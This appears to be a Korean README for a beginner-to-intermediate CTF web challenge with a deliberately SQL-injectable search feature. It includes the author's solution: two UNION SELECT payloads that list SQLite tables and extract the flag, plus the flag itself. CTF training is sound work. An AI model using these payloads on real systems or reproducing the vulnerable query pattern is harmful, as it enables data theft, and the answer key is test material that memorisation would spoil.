# Wrong Door CTF

- 분야: Web Hacking
- 핵심 개념: SQL Injection, 입력값 분석, SQLite 구조 파악
- 난이도: ★★★☆☆

## 실행 방법

프로젝트 폴더에서 아래 순서대로 실행합니다.

```bash
pip install -r requirements.txt
python init.py
python app.py
```

브라우저에서 다음 주소로 접속합니다.

```text
http://127.0.0.1:5000
```

## 출제 의도

로그인 기능은 Prepared Statement를 사용하므로 일반적인 SQL Injection이 발생하지 않습니다.

반면 Search Posts 기능은 사용자 입력을 SQL 문에 직접 삽입하도록 의도적으로 취약하게 만들었습니다.

플레이어는 로그인 화면에만 집중하지 말고 사이트의 다른 기능을 분석해야 합니다.

## 출제자 테스트용 풀이

1. Search Posts에 다음을 입력하고 Search를 누릅니다.

```text
' UNION SELECT name,sql FROM sqlite_master WHERE type='table' --
```

2. `secret` 테이블이 존재하는 것을 확인합니다.

3. 다음을 입력하고 Search를 누릅니다.

```text
' UNION SELECT 'FLAG',flag FROM secret --
```

4. `FLAG{wrong_door}`가 출력됩니다.

> 실제 대회 배포 시에는 `init.py`의 FLAG를 대회용 FLAG로 변경하십시오.
